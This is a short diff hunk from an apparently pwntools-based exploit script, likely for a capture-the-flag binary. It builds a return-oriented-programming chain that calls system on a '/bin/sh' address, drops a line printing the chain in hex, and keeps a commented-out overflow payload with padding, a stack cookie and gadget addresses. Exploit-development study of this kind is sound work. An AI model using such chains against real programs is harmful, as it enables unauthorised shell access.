@@ -53,7 +53,6 @@ g1 = 0x0000000000402083
 rop = ROP(binary)
 rop.call(system_addr, (binsh_addr,))
 
-print rop.chain().encode("hex")
 print rop.dump()
 
 #newpayload = "B"*(0x20-0x8) + cookie + "C" * 8  + p64(g1) + p64(binsh_addr) + p64(system_addr)
